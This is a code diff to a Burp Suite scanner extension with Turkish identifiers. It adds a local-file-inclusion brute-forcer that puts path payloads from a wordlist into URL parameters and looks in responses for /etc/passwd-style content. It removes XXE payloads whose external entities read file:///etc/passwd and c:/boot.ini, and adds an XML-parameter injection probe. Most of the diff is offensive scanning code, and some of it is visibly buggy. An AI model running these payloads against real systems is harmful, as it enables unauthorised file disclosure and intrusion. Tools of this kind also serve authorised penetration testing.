@@ -1101,6 +1101,47 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 mesaj="Error"
 
 
+    def lfi_brute(self,lfibul):
+
+        lfiyollar = open("dict/lfi.txt").readlines()
+
+        protocol = urlparse.urlparse(lfibul).scheme + "://"
+        host = urlparse.urlparse(lfibul).netloc
+        dosya = urlparse.urlparse(lfibul).path
+
+        for lfidizin in lfiyollar:
+            try:
+
+                lfilihal = {}
+
+                for key, value in parse_qs(urlparse.urlparse(lfibul).query, True).items():
+                    lfilihal[key] = lfidizin
+
+                    try:
+                        r = session.get(protocol + host + dosya + "?" + lfilihal)
+                        response = r.text
+                        data = dump.dump_all(r)
+                        rawdata = data.decode('utf-8')
+                        if "root:" in response or \
+                                "0x94Scanner1111" in response or \
+                                "noexecute=optout" in response or \
+                                "<? " in response and "?>" or \
+                                "<?php " in response and "?>" or \
+                                "HTTP_HOST" in response or \
+                                "0x9411111" in response:
+                            self.ekle("GET", lfibul, "Local File Include - Read File",protocol + host + dosya + "?" + lfilihal, rawdata)
+
+                        elif "OC_INIT_COMPONENT" in response or \
+                                "C:\WINDOWS\system32\Setup\iis.dll" in response:
+                            self.ekle("GET", lfibul, "Local File Include - Read File",protocol + host + dosya + "?" + lfilihal, rawdata)
+
+
+                    except:
+                        err = "err"
+
+            except:
+                err = "err2"
+
     def lfitara(self,lfibul):
 
 
@@ -1126,6 +1167,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                             data = dump.dump_all(r)
                             rawdata=data.decode('utf-8')
                             self.ekle("GET", lfibul, "Local File Include Base64",protocol + host + dosya + "?" + lfilihal, rawdata)
+                            self.lfi_brute(lfibul)
                     except:
                         err="err"
 
@@ -1158,52 +1200,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 
 
-    def xxe_injection(self, url, params, method):
-        postgetdict = {}
-        postgetdict = params.copy()
-
-        xxelist=['<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///etc/passwd"> ]>',
-             '<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///c:/boot.ini"> ]>',
-             '<!DOCTYPE foo [<!ENTITY xxe46471 SYSTEM "file:///etc/passwd"> ]>',
-             '<!DOCTYPE foo [<!ENTITY xxe46471 SYSTEM "file:///c:/boot.ini"> ]>',
-             '<?xml version="1.0"?><change-log><text>root:/bin/bash</text></change-log>',
-             '<?xml version="1.0"?><change-log><text>default=multi(0)disk(0)rdisk(0)partition(1)</text></change-log>']
-
-        for xxedene in xxelist:
-
-            try:
-                for key, value in params.items():
-                    if key in postgetdict:
-                        postgetdict[key] = value + xxedene
-                    new_param = {}
-                    new_param =postgetdict.copy()
-                    if method == "GET":
-                        f = session.get(url + "?" + postgetdict)
-                        response=f.text
-
-                        data = dump.dump_all(f)
-                        rawdata = data.decode('utf-8')
-                    else:
-                        f = session.post(url, parametre)
-                        data = dump.dump_all(f)
-                        rawdata = data.decode('utf-8')
-                    self.hatakontrol("POST", url, response, url)
-                    if "XPATH syntax error" in response or "XPathException" in response or \
-                            "System.Xml.XPath.XPathException" in response or \
-                            "Unknown error in XPath" in response or \
-                            "org.apache.xpath.XPath" in response or \
-                            "Cannot convert expression to a number" in response or \
-                            "Empty Path Expression" in response or \
-                            "4005 Notes error: Query is not understandable" in response or \
-                            "root:x:0:0:root" in response:
-                        self.ekle(method, url, "Xpath Injection", url + "DATA" + xxedene, rawdata)
-
-                    self.hatakontrol("XXE", url, response, url)
-
-            except:
-                mesaj = "fff"
-            postgetdict.clear()
-            postgetdict = params.copy()
 
 
     def postget(self, url, params, method):
@@ -2388,7 +2384,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
             self.postrce(formurl, toplamveri,"GET")
             self.frameinjection(formurl, toplamveri,"GET")
             self.templateinjection(formurl, toplamveri,"GET")
-            self.xxe_injection(formurl, toplamveri,"GET")
 
         else:
             #dout.println("formyazdan data geldi")
@@ -2430,9 +2425,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
             self.templateinjection(formurl, toplamveri,"POST")
             
             #dout.println("formyazdan data geldi 11")
-            
-            self.xxe_injection(formurl, toplamveri,"POST")
-            
+
             #dout.println("formyazdan data geldi 12")
 
 
@@ -2510,6 +2503,43 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         except:
             err="err"
 
+
+    def xml_request(self,url,data,degis):
+        try:
+            source = session.post(url, data)
+            if "0x94Scanner@washere" in source.text:
+                self.ekle("POST", url, "XXE Injection Parameter="+degis, data, source.text)
+        except:
+            error="xxx"
+
+    def xml_inject_replace(self,xmldata, valuesi,url,anadata,degis):
+        # xml_value=re.search("<"+degis+">(.*?)</"+degis+">",">0x94",data)
+        eskidata = valuesi
+        # yeni_data=xmldata.replace(valuesi,"0x94Scannere@washere")
+        yeni_data = anadata.replace(eskidata, "0x94Scanner@washere")
+        self.xml_request(url,anadata.replace(eskidata, "0x94Scanner@washere"),degis)
+        # print "Eski="+valuesi
+        #print "Yeni Data=" + yeni_data
+
+    def xml_replace(self,parametre, data,url):
+        degis = parametre.replace("/", "")
+        # xml_value=re.search("<"+degis+">(.*?)</"+degis+">",">bekir",data)
+        xml_value = re.search("<" + degis + ">(.*?)</" + degis + ">", data)
+        if xml_value:
+            self.xml_inject_replace("<" + degis + ">" + xml_value.group(1) + "</" + degis + ">", xml_value.group(1),url,data,degis)
+
+
+    def xml_post_inj_response(self,url,data):
+
+        bul_xml = re.findall("<(.*?)><(.*?)", data)
+        print
+        for slashli in bul_xml:
+            if "/" in slashli[0]:
+                # print slashli[0]
+                self.xml_replace(slashli[0], data,url)
+
+
+
     def starter(self,url):
         #threading.Thread(target = scan_starter, args = (self,url,)).start()
         start_new_thread(self.scan_starter,(url,))
@@ -2519,7 +2549,9 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         start_new_thread(self.tetikle,(url,params,method,))
 
 
+    def starter_xml(self,url,data):
 
+        start_new_thread(self.xml_post_inj_response,(url,data,))
 
     def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
         global taranan
@@ -2566,10 +2598,17 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
                         if method == "POST" :
                             try:
+
                                 httpService = messageInfo.getHttpService()
                                 request = messageInfo.getRequest()
                                 analyzedRequest = self._helpers.analyzeRequest(httpService, request)
                                 body = request[analyzedRequest.getBodyOffset():].tostring()
+
+                                for header in request_header:
+                                    if "Content-Type" in header:
+                                        if "xml" in header:
+                                            self.starter_xml(url.toString(),body)
+
                                 if body!="":
                                     if "&" in body:
                                         body_split=body.split("&")
